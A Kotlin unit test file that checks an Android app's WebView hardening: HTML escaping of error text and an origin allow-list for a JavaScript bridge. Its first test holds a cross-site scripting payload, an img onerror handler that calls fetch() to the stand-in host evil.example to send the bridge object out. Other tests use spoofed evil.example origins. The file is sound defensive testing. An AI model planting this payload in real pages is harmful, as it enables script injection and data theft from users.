package app.aethernext

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The WebView hardening rules (T219). Both primitives are pure, so the exact
 * strings that reach the error page and the exact origins that may use the bridge
 * are asserted here instead of on a device.
 */
class WebViewHardeningTest {

    @Test
    fun markupInAnErrorDescriptionCannotEscapeItsElement() {
        val injected = "<img src=x onerror=fetch('https://evil.example/?s='+window.AetherAndroid)>"
        val escaped = escapeHtml(injected)

        assertFalse("got: $escaped", escaped.contains("<"))
        assertFalse("got: $escaped", escaped.contains(">"))
        assertTrue(escaped.startsWith("&lt;img"))
        // The text is still readable — escaping is not deleting the diagnosis.
        assertTrue(escaped.contains("onerror=fetch"))
    }

    @Test
    fun ampersandsAreEscapedFirstSoNothingDoubleEncodes() {
        assertEquals("&amp;lt;", escapeHtml("&lt;"))
        assertEquals("a&amp;b&quot;c&#39;d", escapeHtml("a&b\"c'd"))
    }

    @Test
    fun aFailingUrlIsEscapedTooAndNullBecomesEmptyText() {
        assertEquals("&lt;script&gt;", escapeHtml("<script>"))
        assertEquals("", escapeHtml(null))
        assertEquals("", escapeHtml(""))
    }

    @Test
    fun onlyThePackagedUiOriginMayUseTheBridge() {
        val trusted = "https://appassets.androidplatform.net/assets/www/index.html"
        assertTrue(isTrustedUiUrl(trusted, APP_HOST, UI_PATH_PREFIX))

        // The pages that can actually end up in the WebView instead.
        assertFalse("the generated error page", isTrustedUiUrl("about:blank", APP_HOST, UI_PATH_PREFIX))
        assertFalse("no page loaded yet", isTrustedUiUrl(null, APP_HOST, UI_PATH_PREFIX))
        assertFalse("a data: document", isTrustedUiUrl("data:text/html,<script>1</script>", APP_HOST, UI_PATH_PREFIX))
        assertFalse("a redirected host", isTrustedUiUrl("https://evil.example/assets/www/index.html", APP_HOST, UI_PATH_PREFIX))
        assertFalse("a port-spoofed host", isTrustedUiUrl("https://appassets.androidplatform.net.evil.example/assets/www/", APP_HOST, UI_PATH_PREFIX))
        assertFalse("plain http", isTrustedUiUrl("http://appassets.androidplatform.net/assets/www/index.html", APP_HOST, UI_PATH_PREFIX))
        assertFalse("a sibling asset directory", isTrustedUiUrl("https://appassets.androidplatform.net/assets/other/index.html", APP_HOST, UI_PATH_PREFIX))
        assertFalse("the host alone, no path", isTrustedUiUrl("https://appassets.androidplatform.net", APP_HOST, UI_PATH_PREFIX))
        assertFalse("empty", isTrustedUiUrl("", APP_HOST, UI_PATH_PREFIX))
    }

    @Test
    fun theHostComparisonIsCaseInsensitiveButThePathIsNotWidened() {
        assertTrue(isTrustedUiUrl("HTTPS://APPASSETS.ANDROIDPLATFORM.NET/assets/www/index.html", APP_HOST, UI_PATH_PREFIX))
        assertFalse(isTrustedUiUrl("https://appassets.androidplatform.net/assets/", APP_HOST, UI_PATH_PREFIX))
    }

    private companion object {
        const val APP_HOST = "appassets.androidplatform.net"
        const val UI_PATH_PREFIX = "/assets/www/"
    }
}
